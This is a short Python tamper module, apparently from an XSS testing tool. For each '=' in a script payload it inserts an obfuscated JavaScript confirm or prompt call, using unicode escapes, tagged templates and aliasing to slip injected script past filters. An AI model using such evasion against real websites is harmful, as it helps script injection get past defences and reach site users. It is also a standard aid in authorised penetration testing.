import re
import random


__PRIORITY__ = 1


def tamper(script):
    functions = (
        "[{}].find(confirm)".format(random.randint(1, 9)), 'confirm()',
        '(confirm)()', 'co\u006efir\u006d()',
        '(prompt)``', 'a=prompt,a()'
    )
    searcher = re.compile("=")
    retval = []
    for c in script:
        if searcher.search(c) is not None:
            c = "={};{}".format(random.choice(functions), c)
        retval.append(c)
    return ''.join(retval)
